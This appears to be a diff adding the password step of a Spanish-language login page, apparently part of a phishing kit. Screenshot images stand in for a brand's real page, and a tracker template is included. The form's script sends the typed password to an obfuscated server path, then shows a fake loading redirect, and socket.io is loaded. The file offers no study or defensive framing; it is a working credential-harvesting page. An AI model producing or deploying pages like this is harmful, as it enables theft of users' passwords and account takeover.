@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <%- include('partials/tracker') %>
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina">
+            <div class="inmaina">
+                <p class="pp1">Iniciar sesión</p>
+                <p><%=pass%><a style="margin-left: 5px; color: #1c72b0;" href="/"> Cambiar </a></p>
+                <!--  -->
+                <div class="pas">
+                    <p class="pp3">Contraseña</p>
+                    <p class="pp4">¿Has olvidado la contraseña?</p>
+                </div>
+                <form method="post" id="pass">
+                    <input type="password" id="password">
+                    <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Introduzca su contraseña.</div>
+                    <button class="btn" type="submit">Iniciar sesión</button>
+                </form>
+                <img class="mb" src="./img/inoforma-pass-mb.png" alt="">
+                <img class="pc" src="./img/inoforma-pass-pc.PNG" alt="">
+            </div>
+            
+        </div>  
+        
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('pass').addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+            
+            // Hide error message if password is not empty
+            errorMessage.style.display = 'none';
+            console.log('Login attempt:', { password });
+
+            $.ajax({
+                url: '/SSwP85AgNE4pnL5mWSM', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({password}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loading?time=3&url=/PrTomeM9HwWUWSulkTe4";
+                    }
+                }
+            });
+        });
+        
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
